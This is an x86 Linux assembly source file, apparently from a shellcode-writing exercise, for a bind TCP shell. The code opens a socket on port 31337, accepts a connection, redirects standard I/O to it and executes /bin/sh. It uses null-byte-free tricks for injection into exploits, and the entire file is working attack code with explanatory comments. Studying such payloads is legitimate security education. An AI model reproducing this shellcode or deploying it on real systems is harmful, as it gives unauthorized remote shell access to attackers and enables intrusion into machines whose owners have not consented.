;Author: Lucas Kauffman
;Purpose: Bind TCP Shellcode
;License: GPLv3

global _start
section .text
_start:
;initiate the variables and clear the variables (trick from msfpayload)
xor ebx,ebx
mul ebx
;first create a socket by pushing the variables


;sockfd = socket(AF_INET, SOCK_STREAM, 0);
mov al,102 ;move syscall into al, do not use eax or you will end up with 0x00
push ebx; Build the arguments list, 0 indicates the default protocol
inc ebx ; increase to one
push ebx  ; 1 on the stack, this is to indicate that we will be using SOCK_STREAM
push byte 0x2 ; 2 is AF_INET
mov ecx, esp ; move the stackpointer into ecx
int 0x80 ; syscall to create a socket file descriptor

mov esi, eax ;  save the socket into ESI so we can use it later to change it with dup2

;Here comes our bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr))  instruction
mov al,102 ;syscall socket
mov bl,2   ; change to bind
push edx ; construct the argument list starting with 0 for INADDRY_ANY
push word 0x697a ; port 31337
push word bx; AF_INET
mov ecx, esp ; this points to the struct we made
push byte 0x10; length of the struct is 16 bytes
push ecx ; this is points to our struct
push esi ; this points to our file descriptor
mov ecx, esp ; move the stackpointer (argument array) into esp
int 0x80

;listen(sockfd, 4);
mov al,102
mov bl,4 ; SYS_LISTEN
push ebx ; construct arguments, max 1 simulatanious connection
push esi ; push the filedescriptor
mov ecx,esp ; ecx = arguments array
int 0x80

;accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
mov al,102
mov bl,5 ; SYS_ACCEPT
push edx ; construct argc, socket length is 0
push edx ; socketaddr  = nulll
push esi; file descriptor
mov ecx, esp ; argument array
int 0x80
 ; This is a trick I found on http://programming4.us/security/704.aspx
 ;dup2(connected socket, {all three standard I/O file descriptors})
  xchg eax, ebx     ; Put socket FD in ebx and 0x00000005 in eax.
  push BYTE 0x2     ; ecx starts at 2.
  pop ecx
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; count down to 0
  jns dup_loop      ; If the sign flag is not set, ecx is not negative.
;call execve as we have done before
; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11
  push edx          ; push some nulls for string termination.
  push 0x68732f2f   ; push "//sh" to the stack.
  push 0x6e69622f   ; push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
  push edx          ; push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])